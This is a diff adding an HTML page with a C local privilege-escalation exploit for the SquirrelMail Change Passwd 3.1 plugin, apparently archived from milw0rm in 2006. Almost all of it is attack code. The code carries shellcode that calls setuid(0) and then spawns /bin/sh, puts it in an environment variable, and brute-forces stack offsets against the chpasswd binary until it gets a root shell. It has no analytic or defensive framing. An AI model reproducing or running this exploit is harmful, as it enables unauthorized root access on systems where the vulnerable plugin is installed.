@@ -1,0 +1,60 @@
+<html>
+<head>
+<title>SquirrelMail 3.1 Change Passwd Plugin Local Buffer Overflow Exploit</title>
+<pre>
+/*
+Change passwd  3.1 (SquirrelMail plugin )
+
+Coded by rod hedor
+
+web-- http://lezr.com
+
+[local exploit]
+
+ * Multiple buffer overflows are present in the handling of command line arguements in chpasswd.
+  The bug allows a hacker to exploit the process to run arbitrary code.
+*/
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+const char shellcode[]=&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;
+                      &quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;
+                      &quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;
+                      &quot;\x31\xc0\xb0\x17\x31\xdb\xcd\x80&quot;
+                      &quot;\x89\xe5\x31\xc0\x50\x55\x89\xe5&quot;
+                      &quot;\x50\x68\x6e\x2f\x73\x68\x68\x2f&quot;
+                      &quot;\x2f\x62\x69\x89\xe3\x89\xe9\x89&quot;
+                      &quot;\xea\xb0\x0b\xcd\x80&quot;;
+
+long get_sp(){
+       __asm__(&quot;movl %esp,%eax;&quot;);
+};
+
+int main(){
+       char buffer[1024];
+       long stack = get_sp();
+       int result = 1;
+       long offset = 0;
+       printf (&quot;[!] Change_passwd v3.1(SquirrelMail plugin) exploit\n&quot;);
+       printf (&quot;[+] Current stack [0x%x]\n&quot;,stack);
+       while(offset &lt;= 268435456){
+       offset = offset + 1;
+       stack = get_sp() + offset;
+       memcpy(&amp;buffer,&quot;EGG=&quot;,4);
+       int a = 4;
+       while(a &lt;= 108){
+               memcpy(&amp;buffer[a],&quot;x&quot;,1);
+               a = a + 1;}
+       memcpy(&amp;buffer[108],&amp;stack,4);
+       memcpy(&amp;buffer[112],&amp;shellcode,sizeof(shellcode));
+       putenv(buffer);
+       result = system(&quot;./chpasswd $EGG&quot;);
+       if(result == 0){exit(0);};
+       };
+};
+
+// milw0rm.com [2006-01-25]
+</pre>
+</html>
+
